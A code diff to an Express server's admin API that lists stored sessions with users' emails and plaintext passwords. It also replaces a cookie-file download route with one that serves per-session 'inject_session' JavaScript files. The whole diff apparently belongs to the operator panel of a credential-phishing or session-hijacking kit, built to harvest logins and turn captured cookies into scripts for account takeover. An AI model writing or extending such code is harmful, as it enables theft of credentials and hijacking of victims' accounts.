@@ -1385,8 +1385,16 @@ app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
             try {
                 const filePath = path.join(sessionDir, file);
                 const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
+                
+                // Generate injection script filename
+                const sessionId = data.id;
+                const injectFilename = `inject_session_${sessionId}.js`;
+                const injectPath = path.join(sessionDir, injectFilename);
+                const hasInjectScript = fs.existsSync(injectPath);
+                
                 return {
                     filename: file,
+                    injectFilename: hasInjectScript ? injectFilename : null,
                     id: data.id,
                     email: data.email,
                     password: data.password,
@@ -1424,8 +1432,8 @@ app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
     res.json(analytics);
 });
 
-// Download cookie file
-app.get('/api/admin/download/:filename', requireAdminAuth, (req, res) => {
+// Download injection script
+app.get('/api/admin/download-inject/:filename', requireAdminAuth, (req, res) => {
     const fs = require('fs');
     const path = require('path');
     const filename = req.params.filename;
@@ -1438,8 +1446,8 @@ app.get('/api/admin/download/:filename', requireAdminAuth, (req, res) => {
     // Remove any path separators and normalize
     const sanitizedFilename = path.basename(filename);
 
-    // Only allow files that start with 'session_' and end with '.json'
-    if (!sanitizedFilename.startsWith('session_') || !sanitizedFilename.endsWith('.json')) {
+    // Only allow files that start with 'inject_session_' and end with '.js'
+    if (!sanitizedFilename.startsWith('inject_session_') || !sanitizedFilename.endsWith('.js')) {
         return res.status(400).json({ error: 'Invalid filename format' });
     }
 
@@ -1462,7 +1470,7 @@ app.get('/api/admin/download/:filename', requireAdminAuth, (req, res) => {
         }
 
         res.setHeader('Content-Disposition', `attachment; filename="${sanitizedFilename}"`);
-        res.setHeader('Content-Type', 'application/json');
+        res.setHeader('Content-Type', 'application/javascript');
         res.sendFile(filePath);
 
     } catch (error) {
